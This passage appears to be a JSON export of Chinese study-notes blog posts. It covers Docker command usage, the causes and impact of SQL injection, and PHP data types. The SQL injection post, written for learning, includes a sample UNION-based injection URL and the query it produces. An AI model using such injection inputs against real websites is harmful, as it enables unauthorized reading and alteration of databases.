docker build github.com/creack/docker-firefox 也可以通过 -f Dockerfile 文件的位置： $ docker build -f /path/to/a/Dockerfile . 在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回： $ docker build -t test/myapp . Sending build context to Docker daemon 2.048 kB Error response from daemon: Unknown instruction: RUNCMD (5)docker history : 查看指定镜像的创建历史。 语法docker history [OPTIONS] IMAGE OPTIONS说明： -H :以可读的格式打印镜像大小和日期，默认为true； –no-trunc :显示完整的提交记录； -q :仅列出提交记录ID。 实例查看本地镜像runoob/ubuntu:v3的创建历史。 root@runoob:~# docker history runoob/ubuntu:v3 IMAGE CREATED CREATED BY SIZE COMMENT 4e3b13c8a266 3 months ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0 B &lt;missing&gt; 3 months ago /bin/sh -c sed -i &#39;s/^#\\s*\\(deb.*universe\\)$/ 1.863 kB &lt;missing&gt; 3 months ago /bin/sh -c set -xe &amp;&amp; echo &#39;#!/bin/sh&#39; &gt; /u 701 B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) ADD file:43cb048516c6b80f22 136.3 MB (6)docker save : 将指定镜像保存成 tar 归档文件。 语法docker save [OPTIONS] IMAGE [IMAGE…] OPTIONS 说明： -o :输出到的文件。 实例将镜像 runoob/ubuntu:v3 生成 my_ubuntu_v3.tar 文档 runoob@runoob:~$ docker save -o my_ubuntu_v3.tar runoob/ubuntu:v3 runoob@runoob:~$ ll my_ubuntu_v3.tar -rw------- 1 runoob runoob 142102016 Jul 11 01:37 my_ubuntu_v3.ta (7)docker load : 导入使用 docker save 命令导出的镜像。 语法docker load [OPTIONS] OPTIONS 说明： –input , -i : 指定导入的文件，代替 STDIN。 –quiet , -q : 精简输出信息。 实例导入镜像： $ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE $ docker load &lt; busybox.tar.gz Loaded image: busybox:latest $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE busybox latest 769b9341d937 7 weeks ago 2.489 MB $ docker load --input fedora.tar Loaded image: fedora:rawhide Loaded image: fedora:20 $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE busybox latest 769b9341d937 7 weeks ago 2.489 MB fedora rawhide 0d20aec6529d 7 weeks ago 387 MB fedora 20 58394af37342 7 weeks ago 385.5 MB fedora heisenbug 58394af37342 7 weeks ago 385.5 MB fedora latest 58394af37342 7 weeks ago 385.5 MB (8)docker import : 从归档文件中创建镜像。 语法docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]] OPTIONS说明： -c :应用docker 指令创建镜像； -m :提交时的说明文字； 实例从镜像归档文件my_ubuntu_v3.tar创建镜像，命名为runoob/ubuntu:v4 runoob@runoob:~$ docker import my_ubuntu_v3.tar runoob/ubuntu:v4 sha256:63ce4a6d6bc3fabb95dbd6c561404a309b7bdfc4e21c1d59fe9fe4299cbfea39 runoob@runoob:~$ docker images runoob/ubuntu:v4 REPOSITORY TAG IMAGE ID CREATED SIZE runoob/ubuntu v4 63ce4a6d6bc3 20 seconds ago 142.1 MB Docker info 命令(1)docker info : 显示 Docker 系统信息，包括镜像和容器数。。 语法docker info [OPTIONS] 实例查看docker系统信息。 $ docker info Containers: 12 Images: 41 Storage Driver: aufs Root Dir: /var/lib/docker/aufs Backing Filesystem: extfs Dirs: 66 Dirperm1 Supported: false Execution Driver: native-0.2 Logging Driver: json-file Kernel Version: 3.13.0-32-generic Operating System: Ubuntu 14.04.1 LTS CPUs: 1 Total Memory: 1.954 GiB Name: iZ23mtq8bs1Z ID: M5N4:K6WN:PUNC:73ZN:AONJ:AUHL:KSYH:2JPI:CH3K:O4MK:6OCX:5OYW (2)docker version :显示 Docker 版本信息。 语法docker version [OPTIONS] OPTIONS说明： -f :指定返回值的模板文件。 实例显示 Docker 版本信息。 $ docker version Client: Version: 1.8.2 API version: 1.20 Go version: go1.4.2 Git commit: 0a8c2e3 Built: Thu Sep 10 19:19:00 UTC 2015 OS/Arch: linux/amd64 Server: Version: 1.8.2 API version: 1.20 Go version: go1.4.2 Git commit: 0a8c2e3 Built: Thu Sep 10 19:19:00 UTC 2015 OS/Arch: linux/amd64","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"SQL 注入原理分析（学习笔记）","date":"2021-10-02T14:45:23.000Z","path":"2021/10/02/sql注入原理/","text":"SQL 注入原理分析（学习笔记）1.SQL语言介绍 ​ SQL 全称是“结构化查询语言( Structured Query Language)”, 最早是IBM的圣约瑟研究实验室为其关系数据库管理系统SYSTEMR开发的一种查询语言,它的前身是SQUARE语言。SQL语言结构简洁,功能强大,简单易学,所以自从IBM公司1981年推出以来, SQL语言得到了广泛的应用。 ​ 结构化查询语言SQL是一种介于关系代数与关系演算之间的语言,其功能包括查询、操纵、定义和控制四个方面,是一个通用的功能极强的关系数据库标准语言。在SQL语言中不需要告诉SQL如何访问数据库,只要告诉SQL需要数据库做什么。 2.SQL注入产生原因 ​ 在现在网络技术于信息技术高速发展的时代，越来越多程序编写应用于B/S模式，而BS模式建立在互联网上，对安全的控制能力较弱，由于开发人员的水平和经验参差不齐，相当一部分的程序员编写代码没有对用户输入的数据或者是页面中所携带的信息进行必要的合法性判断。攻击者利用这个机会提交一段数据库查询代码，根据程序返回的结果，就可以获得一些数据库信息。 3.SQL注入核心原理 ​ SQL注入（SQLi）是一种注入攻击，可以执行恶意SQL语句。它通过将任意SQL代码插入数据库查询，使攻击者能够完全控制Web应用程序后面的数据库服务器。攻击者可以使用SQL注入漏洞绕过应用程序安全措施；可以绕过网页或Web应用程序的身份验证和授权，并检索整个SQL数据库的内容；还可以使用SQL注入来添加，修改和删除数据库中的记录。 ​ SQL注入漏洞可能会影响使用SQL数据库（如MySQL，Oracle，SQL Server或其他）的任何网站或Web应用程序。犯罪分子可能会利用它来未经授权访问用户的敏感数据：客户信息，个人数据，商业机密，知识产权等。SQL注入攻击是最古老，最流行，最危险的Web应用程序漏洞之一。 4.四程WEB框架 ps.灵活的SQL查询语句+用户输入的数据代入了SQL语句=用户直接操作数据库—&gt;SQL注入漏洞 5.用户输入可控，代码对用户输入进行了对接，带入SQL语句，产生SQL注入漏洞 eg：http://xxx.com/index.php?id=1 UNION SELECT 1,version()# ​ ↑ ↑ 正常输入 用户输入可自由控制 select id,location from jobs where id=1——返回id为1的location select id,location from jobs where id =1 union select 1,version()# ——返回id为1的location和数据库文本","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"php 初学笔记","date":"2021-09-18T13:45:23.000Z","path":"2021/09/18/php初学笔记/","text":"#PHP 初学笔记——数据类型1.# 概念 # PHP（PHP: Hypertext Preprocessor）即“超文本预处理器”，是在服务器端执行的脚本语言，尤其适用于Web开发并可嵌入HTML中。PHP语法学习了C语言，吸纳Java和Perl多个语言的特色发展出自己的特色语法，并根据它们的长项持续改进提升自己，例如java的面向对象编程，该语言当初创建的主要目标是让开发人员快速编写出优质的web网站。 PHP同时支持面向对象和面向过程的开发，使用上非常灵活。 2.# 数据类型 # a.PHP支持8种数据类型： （1）integer-整形：只能整数，也可以正数或负数。 （2）folat-浮点型：是数字，和整形数据不同的是它有小数位。 （3）string-字符串型：是字符串，连续的字符序列，可以是计算机所能表示的一切字符的集合。 （4）boolean-布尔型：只有两个值真和假。 （5）array-数组：储存相同数据类型的多个数据项 （6）object-对象：储存类的实例 （7）resource-资源：储存着到外部资源的应用，如打开文件、数据库连接、图形画布区域等 （8）null-空：没有被赋值、已经被重置或赋值为null的变量。 b.PHP数据类型的转换： PHP变量的数据类型是由付给它的值决定的，不用像C语言一样事先声明。 （1）（int）、（integer）：转换成整形——(int)$boo,(integer)$str （float）、（double）、（real）：转换成浮点型——(float)$str,(doubel)$str,(real)$str （string）：转换成字符串————(string)$boo （bool）、（boolean）：转换成布尔类型————(bool)$num,(boolean)$str （array）：转换成数组————(array)$str （object）：转换成对象————(object)$str （unset）:转换为null————(unset)$str （2）ps. 1.&quot;=&quot;是赋值操作符。 2.在进行数据类型转换过程中应注意：转换布尔型时，null、0和未赋值的变量或数组会被转换成false，其它为true。 3.当转换成整形时，布尔型数据的false转换为0，true转换为1，浮点型的小数部分被舍去，字符串型数据如果以小数开头则截取到非数字位，否则转换为0。 4.数据类型转换还可以通过set-type（）函数完成，该函数可以将指点的变量转换为指定的数据类型。————bool settype(mixed $var,string $type) 5.参数type有7个可选值：boolean、float、integer、array、null、object和string如果转换成功，则返回true，否则返回false。 6.当将字符串转换为整形数据时，如果字符串是以数字开头的，那么先将数字部分转换为整形，在舍去后面的字符串；如果数字中含有小数点，那么截取到小数点前一位。 （3）检测数据类型 1&gt; 2&gt;例子 in_numeric()检测变量是否由数字组成 结果","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]}]